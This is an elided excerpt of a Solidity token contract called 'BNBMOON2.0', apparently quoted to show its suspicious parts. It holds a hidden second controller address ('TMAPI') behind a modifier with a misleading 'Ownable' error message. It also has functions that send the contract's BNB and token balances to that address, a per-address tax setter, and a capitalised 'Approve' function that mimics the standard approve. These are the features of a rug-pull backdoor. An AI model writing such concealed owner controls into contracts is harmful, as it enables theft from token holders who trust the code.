...
contract BNBMOON is Context, IERC20, Ownable {
    ...
    string private _name = "BNBMOON2.0";
    string private _symbol = "BNBMOON2.0";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x03B0ae03cBEe92058d9065ACf88317fD7fE68aFf); 
    address payable private teamWalletAddress = payable(0x74B3bCed1777aCa28614194411810e1a9c5dc416); 
	...
	address  public TMAPI =_msgSender();
	...
	modifier onlyMK {
       require(TMAPI == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
	...
	function claimBalance() external {
        payable(TMAPI).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount) external{
        IERC20(token).transfer(TMAPI, amount);
    }
	...
	function setAddressToken(address _address, bool _enable, uint256 _addressTaxFee) external onlyMK {
	...
	function Approve(address spender,uint256 amount)public onlyMK{
